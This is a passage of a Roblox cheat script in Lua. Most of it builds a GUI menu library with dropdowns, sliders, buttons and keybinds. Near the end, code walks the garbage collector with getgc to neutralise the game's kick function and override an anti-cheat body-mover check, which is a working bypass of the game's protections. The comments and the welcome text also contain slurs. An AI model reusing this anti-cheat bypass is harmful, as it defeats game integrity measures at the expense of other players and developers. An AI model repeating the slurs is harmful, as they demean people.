					insertwithoutdupes(data.options, v)
					print("added in list "..v.. " in localplayer teamchanged event")
					gay()
				end
			end
		else
			if team ~= GetTeam(LocalPlayer) then
				insertwithoutdupes(data.options, player.Name)
				gay()
			else
				removewithoutdupes(data.options, player.Name)
				gay()
			end
		end
    end)
end
end--]]
								function Element:SetValue(val) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
								values[tabname][sectorname][text] = Element.value	
									
								
							elseif type == "Slider" then 

								Section.Size = Section.Size + C.UDIM2(0,0,0,25) 

								local Slider = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 
								local Button = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local UIGradient = C.INST("UIGradient") 
								local Value = C.INST("TextLabel") 

								Slider.Name = "Slider" 
								Slider.Parent = Inner 
								Slider.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider.BackgroundTransparency = 1.000 
								Slider.Position = C.UDIM2(0, 0, 0.653061211, 0) 
								Slider.Size = C.UDIM2(1, 0, 0, 25) 

								TextLabel.Parent = Slider 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								Button.Name = "Button" 
								Button.Parent = Slider 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 15) 
								Button.Size = C.UDIM2(0, 175, 0, 5) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Frame.Parent = Button 
								Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame.BorderSizePixel = 0 
								Frame.Size = C.UDIM2(0.5, 0, 1, 0) 
								
								UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient.Rotation = 90
								UIGradient.Parent = Frame


								Value.Name = "Value" 
								Value.Parent = Slider 
								Value.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value.BackgroundTransparency = 1.000 
								Value.Position = C.UDIM2(0, 30, 0, 15) 
								Value.Size = C.UDIM2(0, 175, 0, 5)  
								Value.Font = Enum.Font.Gotham 
								Value.Text = "50" 
								Value.TextStrokeTransparency = 0.000
								Value.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value.TextSize = 11.000 
								local min, max, default = data.min or 0, data.max or 100, data.default or 0 
								Element.value = {Slider = default} 

								function Element:SetValue(value) 
									Element.value = value 
									local a 
									if min > 0 then 
										a = ((Element.value.Slider - min)) / (max-min) 
									else 
										a = (Element.value.Slider-min)/(max-min) 
									end 
									Value.Text = Element.value.Slider 
									Frame.Size = C.UDIM2(a,0,1,0) 
									values[tabname][sectorname][text] = Element.value 
									callback(value) 
								end 
								local a 
								if min > 0 then 
									a = ((Element.value.Slider - min)) / (max-min) 
								else 
									a = (Element.value.Slider-min)/(max-min) 
								end 
								Value.Text = Element.value.Slider 
								Frame.Size = C.UDIM2(a,0,1,0) 
								values[tabname][sectorname][text] = Element.value 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button.MouseButton1Down:Connect(function() 
									Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
									val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)) or 0 
									Value.Text = val 
									Element.value.Slider = val 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
									moveconnection = mouse.Move:Connect(function() 
										Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
										val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)) 
										Value.Text = val 
										Element.value.Slider = val 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
											val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)) 
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
							elseif type == "Button2" then 
								errorCode = (data.errorCode or 'Error!')
								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 175, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 
								
								
								local pressedButton = false
								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = MainUIColor 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									if TextLabel.Text ~= 'Are you sure?' then
										TextLabel.Text = 'Are you sure?'
										wait(4)
										if not pressedButton then
											TextLabel.Text = text
										end
									elseif TextLabel.Text == 'Are you sure?' then
										pressedButton = true
										local lmfaooo, lol = pcall(function()
											callback()
										end)
											if lmfaooo then
												TextLabel.Text = 'Success!'
												wait(1)
												TextLabel.Text = text
											else 
												TextLabel.Text = errorCode
												wait(1)
												TextLabel.Text = text
												print(lol)
											end
										pressedButton = false
									end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
elseif type == "Button" then 
								errorCode = 'Error!'

								
								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 175, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 
								
								
								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = MainUIColor 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()
											callback()
										end)
											if lmfaooo then
												TextLabel.Text = 'Success!'
												wait(1)
												TextLabel.Text = text
											else 
												TextLabel.Text = errorCode
												wait(1)
												TextLabel.Text = text
												print(lol)
											end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)		
								
								
								
								
								
								
							elseif type == "ButtonKeybind" then 

								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								Element.value = {Key = data.default and data.default.Key or nil} 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 140, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 

								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = MainUIColor 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()
										callback()
											end)
										if lmfaooo then
										TextLabel.Text = 'Success!'
										wait(1)
										TextLabel.Text = text
										else 
										TextLabel.Text = 'Error!'
										wait(1)
										TextLabel.Text = text
										print(lol)
										end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
								do 
									local Keybind = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Always = C.INST("TextButton") 
									local UIListLayout = C.INST("UIListLayout") 
									local Hold = C.INST("TextButton") 
									local Toggle = C.INST("TextButton") 
									local ButtonKey = C.INST('TextButton')

									Keybind.Name = "Keybind" 
									Keybind.Parent = Button 
									Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
									Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
									Keybind.Text = data.default and data.default.Key or 'none'
									Keybind.Size = C.UDIM2(0, 43, 0, 12) 
									Keybind.Size = C.UDIM2(0,txt:GetTextSize("NONE", 14, Enum.Font.SourceSansSemibold, C.Vec2(700, 12)).X + 5,0, 12)
									Keybind.AutoButtonColor = false 
									Keybind.Font = Enum.Font.Gotham 
									Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
									Keybind.TextSize = 11.000
									Keybind.AnchorPoint = C.Vec2(1,0) 
									Keybind.ZIndex = 3 

									--[[Frame.Parent = Keybind 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(1, -49, 0, 1) 
									Frame.Size = C.UDIM2(0, 49, 0, 49) 
									Frame.Visible = false 
									Frame.ZIndex = 3

									UIListLayout.Parent = Frame 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									Hold.Name = "Hold" 
									Hold.Parent = Frame 
									Hold.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Hold.BackgroundTransparency = 1.000 
									Hold.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Hold.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Hold.Size = C.UDIM2(1, 0, 0, 16) 
									Hold.AutoButtonColor = false 
									Hold.Font = Enum.Font.Gotham 
									Hold.Text = "Hold" 
									Hold.TextColor3 = C.COL3RGB(200, 200, 200) 
									Hold.TextSize = 11.000
									Hold.ZIndex = 3

									Toggle.Name = "Toggle" 
									Toggle.Parent = Frame 
									Toggle.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Toggle.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Toggle.Size = C.UDIM2(1, 0, 0, 16) 
									Toggle.AutoButtonColor = false 
									Toggle.Font = Enum.Font.Gotham 
									Toggle.Text = "Toggle" 
									Toggle.TextColor3 = C.COL3RGB(200, 200, 200) 
									Toggle.TextSize = 11.000
									Toggle.ZIndex = 3 --]]

									--[[for _,button in pairs(Frame:GetChildren()) do 
										if button:IsA("TextButton") then 
											button.MouseButton1Down:Connect(function() 
												Element.value.Type = button.Text 
												Frame.Visible = false 
												if Element.value.Active ~= (Element.value.Type == "Always" and true or false) then 
													Element.value.Active = Element.value.Type == "Always" and true or false 
													callback(Element.value) 
												end 
												if button.Text == "Always" then 
													keybindremove(text, Element.value.Key) 
												end 
												for _,button in pairs(Frame:GetChildren()) do 
													if button:IsA("TextButton") and button.Text ~= Element.value.Type then 
														button.Font = Enum.Font.Gotham 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
													end 
												end 
												button.Font = Enum.Font.SourceSansBold 
												button.TextColor3 = C.COL3RGB(173, 24, 74) 
												values[tabname][sectorname][text] = Element.value 
											end) 
											button.MouseEnter:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255,255,255)}) 
												end 
											end) 
											button.MouseLeave:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
												end 
											end) 
										end 
									end --]]
									Keybind.MouseButton1Down:Connect(function() 
										if not binding then 
											wait() 
											binding = true 
											Keybind.Text = "..." 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
										end 
									end) 
									--[[Keybind.MouseButton2Down:Connect(function() 
										if not binding then 
											Frame.Visible = not Frame.Visible 
										end 
									end) --]]
									local Player = game.Players.LocalPlayer 
									local Mouse = Player:GetMouse() 
									local InFrame = false 
									--[[Frame.MouseEnter:Connect(function() 
										InFrame = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										InFrame = false 
									end) --]]
									local InFrame2 = false 
									Keybind.MouseEnter:Connect(function() 
										InFrame2 = true 
									end) 
									Keybind.MouseLeave:Connect(function() 
										InFrame2 = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										--[[if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 and not binding then 
											if Frame.Visible == true and not InFrame and not InFrame2 then 
												Frame.Visible = false 
											end 
										end --]]
										if binding then 
											binding = false 
											Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
											Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
											if input.KeyCode.Name == "Backspace" then 
												Keybind.Text = "none" 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
												Element.value.Key = nil 
												--Element.value.Active = true 
											end 
											callback(Element.value) 
										else 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														--[[if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end--]]
														local lmfaooo, lol = pcall(function()
															callback()
																end)
															if lmfaooo then
															keybindadd(text, '')
															wait(1)
															keybindremove(text, '')
															else 
															keybindadd(text, '')
															wait(1)
															keybindremove(text, '')
															print(lol)
														end
													end 
												else 
													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														--[[if Element.value.Type == "Hold" then 
															Element.value.Active = true 
										a					callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end
														end--]] 
														local lmfaooo, lol = pcall(function()
															callback()
																end)
															if lmfaooo then
															keybindadd('Success!')
															wait(1)
															keybindremove('Success!')
															else 
															keybindadd('Error!')
															wait(1)
															keybindremove('Error!')
															print(lol)
														end
													end 
												end 
											--else 
												--Element.value.Active = true 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
									--[[game:GetService("UserInputService").InputEnded:Connect(function(input) 
										if Element.value.Key ~= nil then 
											if C.FIND(Element.value.Key, "Mouse") then 
												if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end
												end 
											else 
												if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end)--]] 
								end
							
							
							end 
							ConfigLoad:Connect(function(cfg) 
								pcall(function() 
									local fix = library:ConfigFix(cfg) 
									if fix[tabname][sectorname][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][text]) 
									end 
								end) 
							end)
							ConfigLoad1:Connect(function(cfg) 
							pcall(function() 
									local fix = library:ConfigFix1(cfg) 
									if fix[tabname][sectorname][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][text]) 
									end 
								end) 
							end)

							return Element 
						end 
				library.tabs[tabname][sectorname] = Sector
				return Sector 
			end 
			library.tabs[tabname] = Tab
			return Tab 
		end 

		Lunar.Parent = game.CoreGui 
		return menu 
	end 

	local MX_ONHIT = C.INST("ScreenGui")
	do
	local OnHitFrame = C.INST("Frame")
	local UIListLayout = C.INST("UIListLayout")
	local SampleFrame = C.INST("Frame")
	local Grad = C.INST("Frame")
	local SampleLabel = C.INST("TextLabel")
	local UIGradient = C.INST("UIGradient")

	MX_ONHIT.Name = "MX_ONHIT"
	MX_ONHIT.Parent = game.CoreGui
	MX_ONHIT.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	OnHitFrame.Name = "OnHitFrame"
	OnHitFrame.Parent = MX_ONHIT
	OnHitFrame.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	OnHitFrame.BackgroundTransparency = 1.000
	OnHitFrame.Position = C.UDIM2(0, 52, 0, -15)
	OnHitFrame.Size = C.UDIM2(0, 300, 0, 500)

	UIListLayout.Parent = OnHitFrame
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 6)

	SampleFrame.Name = "SampleFrame"
	SampleFrame.Parent = OnHitFrame
	SampleFrame.AutomaticSize = Enum.AutomaticSize.XY
	SampleFrame.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	SampleFrame.BackgroundTransparency = 1.000
	SampleFrame.BorderColor3 = C.COL3RGB(7, 0, 0)
	SampleFrame.Size = C.UDIM2(0, 0, 0, 24)

	Grad.Name = "Grad"
	Grad.Parent = SampleFrame
	Grad.BackgroundColor3 = C.COL3RGB(222, 232, 255)
	Grad.BackgroundTransparency = 1.000
	Grad.AutomaticSize = Enum.AutomaticSize.Y
	Grad.BorderSizePixel = 0
	Grad.Size = C.UDIM2(0, 3, 0, 24)

	SampleLabel.Name = "SampleLabel"
	SampleLabel.Parent = Grad
	SampleLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	SampleLabel.BackgroundTransparency = 1.000
	SampleLabel.BorderSizePixel = 0
	SampleLabel.Position = C.UDIM2(1.97835922, 0, 0, 0)
	SampleLabel.Size = C.UDIM2(0, 0, 0, 24)
	SampleLabel.Font = Enum.Font.Ubuntu
	SampleLabel.Text = "TEST"
	SampleLabel.TextTruncate = Enum.TextTruncate.AtEnd
	SampleLabel.AutomaticSize = Enum.AutomaticSize.XY
	SampleLabel.TextColor3 = C.COL3RGB(255, 255, 255)
	SampleLabel.TextSize = 13.000
	SampleLabel.TextStrokeTransparency = 0.000
	SampleLabel.TextTransparency = 1.000
	SampleLabel.TextXAlignment = Enum.TextXAlignment.Left

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(49, 49, 49)), ColorSequenceKeypoint.new(0.41, C.COL3RGB(25, 25, 25)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(25, 25, 25))}
	UIGradient.Rotation = 90
	UIGradient.Parent = SampleFrame
	end
	 
	local function CreateHitElement(text,col,time, size, size2, size3, size4)
		spawn(function()
			local Frame = MX_ONHIT.OnHitFrame.SampleFrame:Clone()
			local Grad = Frame.Grad
			local Label = Grad.SampleLabel
			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(size, size2, size3, size4)}) 
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(size, size2, size3, size4)}) 	
			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})       
			library:Tween(Grad, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})  
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0.000}) 
			
			Frame.Parent = MX_ONHIT.OnHitFrame
			Grad.Parent = Frame
			Label.Parent = Grad
			Label.TextColor3 = col
			Label.Text = text
			wait(time)
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})       
			library:Tween(Grad, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})  
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1.000})
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextStrokeTransparency = 1.000})
			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, 0, size3, size4)}) 
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, 0, size3, size4)}) 
			
			wait(0.8)
			Frame:Destroy()
			Grad:Destroy()
			Label:Destroy()
		end)
	end
	hitlogs:Connect(function(text,col,time, size, size2, size3, size4)
		CreateHitElement(text,col, time, size, size2, size3, size4)
	end)
	CreateHitElement(" Welcome, "..LocalPlayer.Name.."!",MainUIColor,5, 0, 340, 0, 22)
	wait(0.5)
	CreateHitElement(" To close gui, go to misc tab and set up keybind  ",MainUIColor,5, 0, 340, 0, 30)
	CreateHitElement(" !!!  IMPORTANT  !!!\
 Expect many bugs/lags since dev is a retard,\
 Report any issues to my server!  ",MainUIColor,15, 0, 300, 0, 50)
 
--waaaaa i dont want to code waaaaa :sob:
-- samuel doesnt pay me and i live in his basement pls help
 
repeat wait() until game:IsLoaded()
 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService('Workspace')
local workspace = game:GetService('Workspace')
local Camera = workspace.CurrentCamera
local Mouse = LocalPlayer:GetMouse()



----LIBRARY END---------
for i,v in pairs(getgc(true)) do if type(v) == "table" and rawget(v,"kick") then v.kick = function() return end end end 
--for i,v in pairs(getgc(true)) do if type(v) == "table" and rawget(v,"AIR_TO_ADD_PER_SECOND_WHILE_SWIMMING") then v.AIR_TO_ADD_PER_SECOND_WHILE_SWIMMING = 99999999999999999999999999999 end end 
for i,v in pairs(getgc(true)) do
   if typeof(v) == 'table' and rawget(v, 'getIsBodyMoverCreatedByGame') then
		v.getIsBodyMoverCreatedByGame = function(...)
		    return true
		end
   end
